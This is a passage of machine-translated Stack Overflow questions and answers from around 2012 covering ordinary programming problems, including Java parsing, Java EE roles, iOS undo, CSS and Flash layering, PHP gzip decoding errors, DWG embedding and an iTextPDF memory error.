String input = "001234";
if (input.length() != 6) {
    throw new IllegalArgumentException(input);
}
long l = Long.parseLong(input); 
```

实际上它接受一个非零填充的“123456”，但我认为它符合您的要求。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-26T11:16:35.073

我会在正则表达式中进行字符串验证。如果有效，我会使用`Long.parseLong`

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-26T11:16:45.900

`Long#parseLong`会得到你大部分的方式。只需检查它有六位数字，并且结果是肯定的。它不能用除 0 以外的任何东西填充（因为那样解析将失败）。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-12-26T11:16:33.993

你的意思是你想检查长度

```
if (text.length() != 6) 
```

# java - Java EE 用户有多个角色？

> ID：14039787
> 
> 赞同：1
> 
> 时间：2012-12-26T11:12:42.050
> 
> 标签：java, jakarta-ee, roles

在 Java EE/Java 中可以为用户分配多个角色吗？像一个用户可以`administrator`和`reporting-user`同时。两个用户角色都可以访问相同的资源，但管理员也可以访问管理页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:22:27.943

是的，Java EE 中的角色可以重叠。您可以通过为同一用户提供不同的领域来规定这一点，让用户一次访问不同的角色。创建此身份验证的过程根据您使用的应用程序服务器而有所不同，但此身份验证背后的基本概念保持不变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T12:39:22.023

是的，Java EE 中的用户（调用者主体）可以拥有零个、一个或多个角色。不需要多个领域/身份验证模块/区域或特定服务器使用的任何专有术语。

具体来说，像[HttpServletRequest#isUserInRole](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#isUserInRole%28java.lang.String%29)`true`这样的东西可以为同一用户返回角色“foo”和“bar”。

# iphone - iPhone：从 NSMutableArray 中删除图像

> ID：14039790
> 
> 赞同：-1
> 
> 时间：2012-12-26T11:13:03.810
> 
> 标签：iphone, objective-c, ios, xcode, ipad

我正在创建一个存储`UIImage`在其中的应用程序`NSMutableArray`

```
 -(void)mainImageSelected: (id)sender
{    
    mainImageView = [[UIImageView alloc]initWithImage:[UIImage imageNamed:[NSString stringWithFormat:@"image%d.png",[sender tag]]]];
    [myArray addObject:mainImageView];
} 
```

现在，我想在用户触摸的地方显示这个图像。我正在做这样的事情：

```
-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{
    UITouch *touch = [touches anyObject];
    CGPoint point = [touch locationInView:self.view];

    if ([currentObject isEqualToString:@"myObject"])
    {
            NSLog(@"Hello World");
            [self.view addSubview:[myArray lastObject]];
            [[myArray lastObject]setCenter:point];
    }
} 
```

到这里为止，它工作正常，但问题是我想在用户按下撤消按钮时删除此图像。为此，我正在做这样的事情：

```
-(IBAction)Undo
{
    [myArray removeLastObject];
} 
```

它正在从数组中删除对象，但图像没有被删除/删除。任何人请解决这个问题。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-26T11:15:50.783

```
-(IBAction)decorationUndo
{
    [decorationArray removeLastObject];
    [self.view.subviews removeLastObject];
    [self setNeedsDisplay];
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-26T11:16:17.987

您还应该在将图像从数组中删除之前从它所在的视图中删除它：

```
 -(IBAction)decorationUndo
{
  [[myArray lastObject] removeFromSuperview];
  [myArray removeLastObject];
} 
```

在上面的代码中，我假设这是一个包含您的图像`decorationArray`的对象数组。`UIImageView`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-26T11:19:43.377

在从数组中删除它之前，首先将它从视图中删除。

```
-(IBAction)Undo
{
    [[myArray lastObject] removeFromSuperview];
    [myArray removeLastObject];
} 
```

# java - APIDemos 示例中的 Android 主题

> ID：14039792
> 
> 赞同：1
> 
> 时间：2012-12-26T11:13:20.453
> 
> 标签：java, android

我查看了 Android 4.2 的 APIDemos 示例。所有 listView 的项目都由一条白线分隔。

我创建了一个简单的项目（Android 4.2），并将 style.xml 更改为（而不是 Theme.Light）：

```
<style name="Theme" parent="android:Theme"> </style> 
```

它显示黑色背景，但没有白色分隔线。我无法理解它是如何在 APIDemos 示例中设置的。你可以帮帮我吗？

我添加了`<item name="android:divider" >@android:color/white</item>`

但它不适用于listView。

这是我的列表视图：

```
mAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, mStrings); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:41:30.797

您是否更改了清单中的主题？

自定义列表的另一种可能性是将 ListView 定义为 XML (my_list.xml)。在那里你可以添加属性“android:divider”。如果您正在使用片段，您还可以在充气 my_list.xml 后在 onCreateView() 中调用 getListView。

# qt - Qt中如何实现单服务器-多客户端以太网通信（参考财富服务器-客户端）？

> ID：14039796
> 
> 赞同：0
> 
> 时间：2012-12-26T11:13:50.713
> 
> 标签：qt, qt4

如何在qt中实现单服务器和多客户端通信。查看qt中的财富服务器示例，每次分配的端口都不同，即我无法控制分配的端口。如何为多个客户端分配端口并且不同每个客户端连接的端口？？

# html - CSS box-shadow 在 Firefox 中落后于 Flash 播放器

> ID：14039799
> 
> 赞同：4
> 
> 时间：2012-12-26T11:14:15.427
> 
> 标签：html, css

我想创建一个带有css box-shadow的下拉菜单，并且我有一些使用flash的内容，问题是当下拉菜单出现并且后面有flash时，没有显示box-shadow。实际上 box-shadow 落后于 flash player

我简化了结构 ![http://i.imgur.com/QEjlt.jpg](../Images/09499259203ef89a0031c6d178031720.png)

我正在使用 Firefox 17.0.1 、 chrome 23.0.1271.97 和 flash player 11.5.502.135

风格

```
.test { position:absolute; z-index: 100; left:50%; top:30px; border:3px solid blue;width:200px; height:200px; background:gray; box-shadow:50px 50px 130px #000}
#flash{ position:absolute; left:50%; z-index:-100} 
```

HTML结构

```
<div class="test"></div>
<div id="flash">    
<object width="100%" height="400" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000">
<param value="28bc2_2.swf" name="SRC">
<embed width="100%" height="400" src="28bc2_2.swf">
</object>
</div> 
```

任何人都知道会发生什么以及解决方案，感谢您的帮助:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:39:43.570

要获得 box-shadow 跨浏览器，您需要以下代码：

```
box-shadow: 50px 50px 130px #000;
-webkit-box-shadow: 50px 50px 130px #000;
-moz-box-shadow: 50px 50px 130px #000; 
```

还可以尝试将`wmode`参数添加到 embed flash：

```
<div class="test"></div>
<div id="flash">    
<object width="100%" height="400" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000">
<param value="28bc2_2.swf" name="SRC">
<param value="transparent" name="wmode">
<embed width="100%" height="400" wmode="transparent" src="28bc2_2.swf">
</object> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:36:30.703

尝试添加：-moz-box-shadow:50px 50px 130px #000000;

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:38:25.693

除了使用跨浏览器 css ...（-moz- 和 -webkit- 就像其他人提到的那样）

尝试将 z-index 值设置为`.test`高于 的 z-index 值`#flash`。另外，尝试将#flash 放在带有`.test`类的 div 中。

现在，您似乎将 flash div 的 z-index 设置为 -100，而您的测试（这是您的菜单吗？）的 z-index 设置为 100...所以您的 flash 内容自然会落后`.test`。

# microdata - 通过 schema.org/OpeningHoursSpecification 使用微数据

> ID：14039803
> 
> 赞同：6
> 
> 时间：2012-12-26T11:14:37.050
> 
> 标签：microdata, schema.org

我正在查看地点（以及更多）的[http://schema.org/OpeningHoursSpecification](http://schema.org/OpeningHoursSpecification)微数据模式。[我对用于DayOfWeek](http://schema.org/DayOfWeek)的值有点困惑。

这两个类（*OpeningHoursSpecification*和*DayOfWeek*）都来自 GoodRelations 电子商务词汇，我对这个词汇没有信心。

拜托，你能发布一个完整的例子吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-26T19:58:50.117

GoodRelations 模型的枚举（预定义值列表）保留在 GoodRelations 命名空间中，即对于星期一，使用

```
http://purl.org/goodrelations/v1#Monday 
```

这是一个完整的例子：

```
<div itemscope itemtype="http://schema.org/Place" itemid="#store">
  <span itemprop="name">Hepp's Happy Burger Restaurant</span>
  <div itemprop="openingHoursSpecification" itemscope 
       itemtype="http://schema.org/OpeningHoursSpecification">
Opening hours: Mo-Fri,
     <link itemprop="dayOfWeek" 
           href="http://purl.org/goodrelations/v1#Monday" />
     <link itemprop="dayOfWeek" 
           href="http://purl.org/goodrelations/v1#Tuesday" />
     <link itemprop="dayOfWeek" 
           href="http://purl.org/goodrelations/v1#Wednesday" />
     <link itemprop="dayOfWeek" 
           href="http://purl.org/goodrelations/v1#Thursday" />
     <link itemprop="dayOfWeek" 
           href="http://purl.org/goodrelations/v1#Friday" />
     <meta itemprop="opens" content="08:00:00">8:00 a.m. -
     <meta itemprop="closes" content="20:00:00">8:00 p.m.
  </div>
</div> 
```

希望有帮助！

# php - 错误 330（净：：ERR_CONTENT_DECODEDING_FAILED）：

> ID：14039804
> 
> 赞同：101
> 
> 时间：2012-12-26T11:14:41.097
> 
> 标签：php, openx

最近我们迁移到了一个新的服务器。2天后，我遇到了以下问题

1）我们在会话表上发生了崩溃，我们很容易通过修复它来修复它

2）我们将OpenX作为我们的广告服务器运行，它也崩溃了，但是error.log中没有证据它让你登录，但是在查看dashboard.php的那一刻，我们得到：

```
Error 330 (net::ERR_CONTENT_DECODING_FAILED): (Google Chrome) 
```

和

您尝试查看的页面无法显示，因为它使用了无效或不受支持的压缩形式。(火狐)

* * *

OpenX 在 PHP 上使用以下服务：

OpenX 要求： [http ://www.openx.com/docs/2.8/adminguide/System%20requirements](http://www.openx.com/docs/2.8/adminguide/System%20requirements)

OpenX 使用默认的 PHP 设置。但是，服务器管理员有时会更改这些设置。在安装 OpenX 之前，请检查以下设置是否正确：

magic_quotes_runtime 必须关闭 safe_mode 必须关闭 register_argc_argv 如果您想通过命令行运行维护，则必须打开 file_uploads 需要打开以允许 HTTP 文件上传 OpenX 需要以下 PHP 扩展：

扩展`mysql`名或`pgsql`. `mysqli`不支持扩展。ZLib 扩展，用于转换由`Flash MX`. FTP 扩展。如果这不存在，OpenX 将尝试模拟它，这可能是一个不太稳定的解决方案。

GD 扩展，用于在主页上生成图表。如果未启用扩展程序，您将无法在主页上查看图表或统计信息。要登录到主页，需要 openssl 扩展或启用 SSL 的 curl 扩展。如果未启用 SSL，您将在主页中收到错误消息，但不会影响操作。

* * *

任何有关可能原因或如何收集更多信息的线索将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：138
> 
> 时间：2012-12-26T12:02:21.420

当您的 HTTP 请求的标头声称内容是 gzip 编码时会发生这种情况，但事实并非如此。关闭 gzip 编码设置或确保内容实际上已编码。

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2015-02-26T14:33:00.063

我启用`zlib.output_compression`了`php.ini`它，它似乎为我解决了这个问题。

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2013-10-02T23:04:12.083

代码在录制时需要保存没有BOM的UTF8。有时，用（Notepad++）或其他编码工具编写代码并使用UTF8编码，会发生此错误。对不起，我不懂英语。这只是我的经验。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2015-01-05T14:15:28.960

由于添加了输出缓冲模块扩展（ob_gzhandler）而导致此错误。在开始 ob_start() 和结束 ob_flush() 时使用输出缓冲

```
<?php   
    ob_start( 'ob_gzhandler' ); 
    echo json_encode($array);
    ob_end_flush();
?> 
```

用这个：

```
<?php   
    ob_start(); 
    echo json_encode($array);
    ob_flush();
?> 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2016-12-23T07:37:11.520

如果您要使用`Codeigniter`框架，那么只需将其放入配置文件中：

```
$config['compress_output'] = FALSE; 
```

在`php.ini`配置文件中，使用：

```
zlib.output_compression=On 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-06-19T02:23:42.080

你使用这个`ob_start(ob_gzhandler)`功能吗？如果是这样并且如果您在`ob_start(ob_gzhandler)`函数上方输出任何内容，您将收到此错误。您可以不使用该功能，也可以不输出高于该功能的内容。回调函数将`ob_gzhandler`确定浏览器将接受哪种类型的内容编码，并将相应地返回其输出。因此，如果您在此函数上方输出内容，则内容的编码可能与输出内容不同`ob_gzhandler`，从而导致此错误。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2017-01-21T15:54:03.143

其他人得到这个的另一个想法......

我有一些 gzipped svg，但它在输出中有一个 php 错误，这导致了这个错误消息。（因为 gzip 二进制文件中间有文本。）修复 php 错误解决了它。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2017-02-10T19:23:16.027

**在php.ini**中启用 gzip 压缩：

```
zlib.output_compression = On 
```

并将其添加到您的**.htaccess**文件中：

```
<IfModule mod_deflate.c>
  # Compress HTML, CSS, JavaScript, Text, XML and fonts
  AddOutputFilterByType DEFLATE application/javascript
  AddOutputFilterByType DEFLATE application/rss+xml
  AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
  AddOutputFilterByType DEFLATE application/x-font
  AddOutputFilterByType DEFLATE application/x-font-opentype
  AddOutputFilterByType DEFLATE application/x-font-otf
  AddOutputFilterByType DEFLATE application/x-font-truetype
  AddOutputFilterByType DEFLATE application/x-font-ttf
  AddOutputFilterByType DEFLATE application/x-javascript
  AddOutputFilterByType DEFLATE application/xhtml+xml
  AddOutputFilterByType DEFLATE application/xml
  AddOutputFilterByType DEFLATE font/opentype
  AddOutputFilterByType DEFLATE font/otf
  AddOutputFilterByType DEFLATE font/ttf
  AddOutputFilterByType DEFLATE image/svg+xml
  AddOutputFilterByType DEFLATE image/x-icon
  AddOutputFilterByType DEFLATE text/css
  AddOutputFilterByType DEFLATE text/html
  AddOutputFilterByType DEFLATE text/javascript
  AddOutputFilterByType DEFLATE text/plain
  AddOutputFilterByType DEFLATE text/xml

  # Remove browser bugs (only needed for really old browsers)
  BrowserMatch ^Mozilla/4 gzip-only-text/html
  BrowserMatch ^Mozilla/4\.0[678] no-gzip
  BrowserMatch \bMSIE !no-gzip !gzip-only-text/html
  Header append Vary User-Agent
</IfModule> 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2016-11-09T13:30:43.433

如果有人仍在寻找这个可恨问题的原因，那么有一个解决方案可以确定导致文件的原因。[https://www.drupal.org/node/1622904#comment-10768958](https://www.drupal.org/node/1622904#comment-10768958)来自`Drupal`社区。

我引用：

编辑

`includes/bootstrap.inc:`

功能`drupal_load()`。这是一个简短的功能。找到以下行： `include_once DRUPAL_ROOT . '/' . $filename;` 暂时将其替换为

```
ob_start();
include_once DRUPAL_ROOT . '/' . $filename;
$value = ob_get_contents();
ob_end_clean();
if ($value !== '') {
  $filename = check_plain($filename);
  $value = check_plain($value);
  print "File '$filename' produced unforgivable content: '$value'.";
  exit;
} 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2018-07-23T11:49:30.857

今天早上，当我意识到是什么导致了我的这个问题时，我有一点虚弱的时刻。

奇怪的是，该请求在 Firefox 和 Chrome 中都失败了，但是当我尝试通过 Fiddler Web Debugger 访问时，它工作了。

对我来说，问题是我在项目中的一个 PHP 文件中输入了错误的字符。直到我检查了 Git 对项目的更改，我才注意到这一点。

就我而言，我有：`m<?php runMyProgram(); ?>`。

一旦我删除了 m，它又开始工作了。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2019-06-03T19:13:21.193

就我而言，它是在向 IIS 添加一个需要使用 Apache 代理的新应用程序时发生的。

我需要设置`ProxyHTMLEnable On`为`ProxyHTMLEnable Off`获取内容。（看起来大多数 js 代码都触发了错误，但这至少给了我一些工作的余地。）

IIS 正在发送页面内容`Content-Encoding: gzip`

```
<Proxy "http://192.168.1.1:81">
    ProxyHTMLEnable On   #> change this to Off
    ProxyHTMLURLMap  ...  ...
</Proxy> 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2017-07-07T14:51:55.877

我在一个[drupal](/questions/tagged/drupal "显示标记为“drupal”的问题")站点上遇到了这个问题，这个线程中的其他解决方案都没有帮助。经过一些故障排除后，我发现 local.settings.php 有一个结束标记，后面有一个空格，如下所示：

```
<?php
$databases = array(
  'default' =>
  array (
    'default' =>
    array (
      'driver' => 'mysql',
      'database' => 'xxx',
      'username' => 'xxx',
      'password' => 'xxx',
      'port' => '',
      'host' => 'xxx',
    ),
  ),
);
?> 
```

将 local.settings.php 更新为以下已解决：

```
<?php
$databases = array(
  'default' =>
  array (
    'default' =>
    array (
      'driver' => 'mysql',
      'database' => 'xxx',
      'username' => 'xxx',
      'password' => 'xxx',
      'port' => '',
      'host' => 'xxx',
    ),
  ),
); 
```

结束 "?>" PHP 标记在这里不是必需的。如果您选择使用结束标记，则必须确保其后没有字符/空格。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-06-19T21:50:39.703

在将系统升级到 Revive 时，我们也遇到了这个问题。开启 GZIP 后，我们发现问题仍然存在。经过进一步调查，我们发现升级后文件权限不正确。一个简单的递归 chmod 就可以了。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-08-27T19:38:24.957

我在启用 PageSpeed 模块的情况下看到了这个错误。PageSpeed 模块有一个可以被 gzip 压缩的缓存。因此，显然可能发生的是内容被双重压缩。

> 为了重写资源，PageSpeed 必须在服务器端缓存它们。在 1.10.33.0 之前，这些资源一直未压缩存储。为了减少磁盘使用、减少服务器延迟、支持更高的压缩级别并提高服务器吞吐量，HTTPCache 可以在可压缩资源存储在缓存中时自动 gzip 压缩资源。要配置缓存压缩，请将 HttpCacheCompressionLevel 设置为 -1 和 9 之间的值，其中 0 表示关闭，-1 是 gzip 的默认压缩，9 是最大压缩。默认值为 9，最大压缩。

我通过将此行添加到我的 PageSpeed 配置来解决它：

HttpCacheCompressionLevel 0

禁用压缩。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-10-15T17:22:39.930

有一个糟糕的 Java 错误会导致此问题： [https ://bugs.java.com/view_bug.do?bug_id=JDK-8189789](https://bugs.java.com/view_bug.do?bug_id=JDK-8189789)

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2020-02-20T18:48:16.127

一个更常见的答案是你有一些错误被附加到你的压缩中。解决方案是`display_errors = Off`在您的 php.ini 文件中进行设置（通过运行检查您的终端是否打开`php --info`并查找“display_errors”）

那应该这样做。而且，你如何发现你实际上是什么错误？每当您点击该路线/页面时，请检查您的 PHP 错误日志。

祝你好运！

# html - 在 HTML 中嵌入 DWG 文件

> ID：14039807
> 
> 赞同：2
> 
> 时间：2012-12-26T11:14:58.827
> 
> 标签：html, embed, autocad, dwg, autocad-plugin

我想问如何在 HTML 页面中嵌入 DWG 文件。

我曾尝试将标签与 Volo Viewer 一起使用，但此解决方案仅在 IE 中运行，而不在 Firefox 和 Chrome 中运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-10T01:46:44.420

Dwgview-x 可以做到这一点，但它需要作为插件安装在客户端计算机上，以便任何人都可以查看您在线嵌入的 dwg 文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-03T03:58:10.350

可能有您可以使用的第三方 ActiveX 控件，但我认为最终您会发现它对于绘制平均复杂度的文件是不切实际的。我建议按需创建 DWF（如果您需要矢量格式）或 PNG 文件（例如使用来自[http://usa.autodesk.com/design-review/](http://usa.autodesk.com/design-review/)的免费 DWG TrueView ）并嵌入这些文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-02T20:59:45.190

您可以在此处找到我认为是 Autodesk 实验室网站的最新信息：http: [//labs.blogs.com/its_alive_in_the_lab/2014/01/share-your-autodesk-360-designs-on-company-web-sites .html](http://labs.blogs.com/its_alive_in_the_lab/2014/01/share-your-autodesk-360-designs-on-company-web-sites.html)

看起来可以嵌入 DWG，此页面上有一个示例，但显然 DWF 是要走的路。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-04-30T06:38:14.420

您可以通过将文件的页面呈现为 HTML 页面或图像来将 DWG 文件的内容嵌入到 HTML 页面中。如果您发现它是一个有吸引力的解决方案，那么您可以使用[GroupDocs.Viewer](https://products.groupdocs.com/viewer/) API 来实现，它允许您将文档页面呈现为 HTML 页面、图像或整个 PDF 文档。然后，您可以在 HTML 页面中包含呈现的 HTML/图像页面或整个 PDF 文档。

**使用 C#**

```
ViewerConfig config = new ViewerConfig();
config.StoragePath = "D:\\storage\\";

// Create HTML handler (or ViewerImageHandler for rendering document as image)
ViewerHtmlHandler htmlHandler = new ViewerHtmlHandler(config);

// Guid implies that unique document name 
string guid = "sample.dwg";

// Get document pages in html form
List<PageHtml> pages = htmlHandler.GetPages(guid);

// Or Get document pages in image form using image handler
//List<PageImage> pages = imageHandler.GetPages(guid);

foreach (PageHtml page in pages)
{
    // Get HTML content of each page using page.HtmlContent
} 
```

**使用 Java**

```
// Setup GroupDocs.Viewer config
ViewerConfig config = new ViewerConfig();
// Set storage path
config.setStoragePath("D:\\storage\\");

// Create HTML handler (or ViewerImageHandler for rendering document as image)
ViewerHtmlHandler htmlHandler = new ViewerHtmlHandler(config);

String guid = "Sample.dwg"

// Get document pages in HTML form
List<PageHtml> pages = htmlHandler.getPages(guid);

for (PageHtml page : pages) {
     // Get HTML content of each page using page.getHtmlContent
} 
```

*披露：我在 GroupDocs 担任开发人员布道师。*

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-12-07T20:22:16.477

我使用 DWG 浏览器。它是一个独立的程序，用于报告和分类带有预览的图纸。它也将导出保存在 html 中。

他们提供免费的演示下载。

[http://www.graytechnical.com/software/dwg-browser/](http://www.graytechnical.com/software/dwg-browser/)

# javascript - 页面导航不会丢失表单字段数据？

> ID：14039822
> 
> 赞同：1
> 
> 时间：2012-12-26T11:16:06.277
> 
> 标签：javascript, jquery, ajax

我想知道不是使用 PHP Sessions 来保存字段数据，在 Ajax 或 jQuery 中是否有任何概念，可以在很多表单页面之间导航，但是要保存表单数据，直到用户提交，如果用户提交，所有不同页面上的信息也应该提交。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:23:39.120

这种类型有多个概念。

您可以将 JavaScript 与 jQuery 库一起使用，使用用于 HTML 元素操作的函数对巨大的表单进行分页。这样，您不需要用户创建另一个 HTTP 请求，因此在其他页面上输入的信息不会在用户切换页面时丢失。然后可以使用 AJAX 或普通的“前端”HTTP 请求方法提交表单。

此外，您可以尝试使用 JavaScript 和 jQuery 将输入的信息保存在 cookie 中。

以下是 jQuery 分页的一些示例：

[http://dl.dropbox.com/u/4151695/html/pajinate/examples/example1.html](http://dl.dropbox.com/u/4151695/html/pajinate/examples/example1.html)。

您可以轻松地将这些概念应用于任何内容，包括 HTML 表单。

以下是各种带有源代码的插件：

[http://www.jquery4u.com/plugins/10-jquery-pagination-plugins/](http://www.jquery4u.com/plugins/10-jquery-pagination-plugins/)。

Cookie 只不过是存储在访问者计算机上的纯文本文件，这意味着您可以轻松地对表单数据进行编码并将其嵌入其中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:35:41.807

您可以尝试表单向导它的 jquery 插件：[http ://www.jankoatwarpspeed.com/post/2009/09/28/webform-wizard-jquery.aspx](http://www.jankoatwarpspeed.com/post/2009/09/28/webform-wizard-jquery.aspx)

# titanium - 在消息线程中显示最后一条消息：Titanium.Cloud.Messages

> ID：14039826
> 
> 赞同：0
> 
> 时间：2012-12-26T11:16:29.310
> 
> 标签：titanium, message, appcelerator, titanium-mobile

我正在创建一个应用程序，它使用 Titanium 框架在应用程序用户中发送消息。在应用程序中，我必须显示用户之间的对话（消息线程）。我正在使用以下代码中给出的线程

```
var tableView = Ti.UI.createTableView({
   top          : '10%',
   scrollable  : true,
   width        : '100%',
   minRowHeight: '50',
   bottom       : '10%'
});

/*getting the message threads and adding them to the tableview
  and displaying it while opening the window*/

win1.addEventListener('open', function(){
   tableData = [];
   Cloud.Messages.showThreads(function (e) {
       if (e.success) {
           Ti.API.info('Success: ' +'Count: ' + e.messages.length);
           for (var i = 0; i < e.messages.length; i++) {
               var message = e.messages[i];
               //alert(JSON.stringify(message));
               var row = Ti.UI.createTableViewRow({
                   title            : message.body,
                   backgroundColor : '#FF9900',
                   threadID     : message.thread_id ,
                   color            : 'blue'
               });

               tableData.push(row);
           }
           tableView.data = tableData;
       } else {
           alert('Error: ' + ((e.error && e.message) || JSON.stringify(e)));
       }
   });
}); 
```

我想在 tableViewRow 的每个线程中显示最后一条消息（标记为消息正文）。但是每个线程的消息正文不显示对话中的最后一条消息，而是显示第一条消息。

![消息的图像](../Images/f0a7b624553ca9856d2aceb6d5f93a8f.png).

任何人都可以帮助我吗？提前致谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T05:00:14.963

终于我明白了。我对代码进行了一些更改。

```
win1.addEventListener('open', function() {
tableData = [];
// show all threads
Cloud.Messages.showThreads(function(eThread) {
    if (eThread.success) {
        Ti.API.info('Total Threads: ' + eThread.messages.length);
        for (var i = 0; i < eThread.messages.length; i++) {
            var thread = eThread.messages[i];
            var message = "";
        // get the newest message from a thread
            Cloud.Messages.showThread({
                thread_id : thread.thread_id
            }, function(eMessage) {
                    if (eMessage.success) {
                        var totalMessages = eMessage.messages.length;
                        Ti.API.info('Total messages in the thread ' + totalMessages);
                         //Getting the last message in the thread. 
                        message = eMessage.messages[0];
                         var row = Ti.UI.createTableViewRow({
                                title : message.body,
                            backgroundColor : '#FF9900',
                                threadID : thread.thread_id,
                                color : 'blue'
                        });

                        tableData.push(row);
            tableView.data = tableData;
                } else {
                    alert('Error showThread: ' + ((eMessage.error && eMessage.message) || JSON.stringify(eMessage)));
                }
             }); 
        }
    } else {
        alert('Error showThreads: ' + ((eThread.error && eThread.message) || JSON.stringify(eThread)));
    }
});
}); 
```

参考：[显示消息线程中的最后一条消息](http://developer.appcelerator.com/question/146167/display-the-last-message-in-message-threads#answer-253465)。我从链接中的马蒂亚斯先生的回答中得到了提示。那里也给出了描述。可能对其他人有帮助。

# appharbor - 有限时间范围内的多个实例

> ID：14039832
> 
> 赞同：-1
> 
> 时间：2012-12-26T11:16:50.643
> 
> 标签：appharbor

我将运行一个完整的实例，通常是免费的。如果我每月运行第二个实例 30 小时，我将如何计费？你按小时计费吗？还是我需要升级双体船才能使用第二个实例？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T20:56:24.067

您只需为实际消耗资源的时间付费，您无需更改计划添加额外的工作人员。只需在您需要的时间内添加额外的工作人员，您就会为所用的时间付费。

# java - iTextPDF 可以读取多少文件？

> ID：14039834
> 
> 赞同：0
> 
> 时间：2012-12-26T11:16:57.173
> 
> 标签：java, android, itextpdf

我在我的应用程序中**强制关闭**，当我选择 file1（大小：33,016,510 - 不确定是字节还是 kb）但当我尝试 file2（大小：604,612）时，它不会强制关闭。**iTextPDF 可以读取多少文件？**

文件1：400-500页，有图像背景和图像，但文本都是**HIGHLIGHTABLE**，因此可以读取文本（这是我确定PDF内容是文本还是图像的方法，如果我错了，请纠正我）。

文件2：30-50页，有图片，没有背景。

我有想法为什么它会强制关闭。

1.  由于PDF文件大小。
2.  代码它自己。
3.  PDF 的内容。

我用来阅读PDF的代码：

```
page_Content = PdfTextExtractor.getTextFromPage(
                    reader, 0, new SimpleTextExtractionStrategy()); 
```

**这里有什么问题？**

如果信息不足，请在下方评论。

例外：

```
12-26 19:20:19.026: E/AndroidRuntime(1119): FATAL EXCEPTION: main
12-26 19:20:19.026: E/AndroidRuntime(1119): java.lang.OutOfMemoryError
12-26 19:20:19.026: E/AndroidRuntime(1119):     at java.util.ArrayList.add(ArrayList.java:123)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfArray.add(PdfArray.java:269)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.readArray(PdfReader.java:1608)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.readPRObject(PdfReader.java:1657)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.readDictionary(PdfReader.java:1588)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.readPRObject(PdfReader.java:1624)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.readDocObj(PdfReader.java:1143)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.readPdf(PdfReader.java:511)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.<init>(PdfReader.java:170)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.itextpdf.text.pdf.PdfReader.<init>(PdfReader.java:159)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.example.panalyzerdemo.InformationRetrieval.pdfFilePath(InformationRetrieval.java:54)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at com.example.panalyzerdemo.MainActivity.onActivityResult(MainActivity.java:207)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.app.Activity.dispatchActivityResult(Activity.java:3890)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.app.ActivityThread.deliverResults(ActivityThread.java:3514)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.app.ActivityThread.handleSendResult(ActivityThread.java:3560)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.app.ActivityThread.access$2800(ActivityThread.java:128)
12-26 19:20:19.026: E/AndroidRuntime(1119):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2066)
